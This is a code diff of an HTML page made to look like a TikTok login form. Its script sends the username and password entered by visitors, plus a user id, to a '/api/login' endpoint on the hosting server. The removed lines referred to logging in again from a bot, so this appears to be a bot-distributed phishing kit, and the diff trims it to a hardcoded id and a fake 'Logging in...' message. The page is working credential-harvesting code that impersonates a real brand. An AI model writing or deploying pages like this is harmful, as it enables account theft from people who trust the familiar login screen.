@@ -27,80 +27,45 @@
       margin-bottom: 20px;
       color: #fe2c55;
     }
-    input {
+    input, button {
       width: 100%;
       padding: 12px;
       margin: 10px 0;
       border: none;
       border-radius: 6px;
-      background: #333;
-      color: #fff;
     }
     button {
-      width: 100%;
-      padding: 12px;
       background-color: #fe2c55;
       color: #fff;
       font-weight: bold;
-      border: none;
-      border-radius: 6px;
       cursor: pointer;
-      margin-top: 10px;
-    }
-    button:hover {
-      background-color: #ff3b6e;
-    }
-    button:disabled {
-      background-color: #cccccc;
-      cursor: not-allowed;
     }
   </style>
 </head>
 <body>
   <div class="login-box">
-    <h2>TikTok Login</h2>
+    <h2>Log in to TikTok</h2>
     <form id="loginForm">
       <input type="text" name="username" placeholder="Username or Email" required />
       <input type="password" name="password" placeholder="Password" required />
       <button type="submit">Log In</button>
     </form>
   </div>
-
   <script>
     document.getElementById('loginForm').addEventListener('submit', async function(e) {
       e.preventDefault();
-      
-      // Disable button to prevent multiple clicks
-      const button = e.target.querySelector('button');
-      button.disabled = true;
-
-      const urlParams = new URLSearchParams(window.location.search);
-      const uid = urlParams.get('uid');
       const username = e.target.username.value;
       const password = e.target.password.value;
 
-      if (!uid) {
-        alert("❗ UID نشته، مهرباني وکړئ له بوټ څخه بېرته لاگ ان وکړئ.");
-        button.disabled = false;
-        return;
-      }
+      const uid = 123456; // optional - you can replace or fetch this dynamically
 
-      try {
-        const res = await fetch('/api/login', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ username, password, uid })
-        });
+      await fetch('/api/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username, password, uid })
+      });
 
-        const msg = await res.text();
-        alert(msg);
-      } catch (error) {
-        console.error("Error:", error);
-        alert("❌ یوه ستونزه پېښه شوه.");
-      }
-
-      // Re-enable the button after operation completes
-      button.disabled = false;
+      alert('Logging in...');
     });
   </script>
 </body>
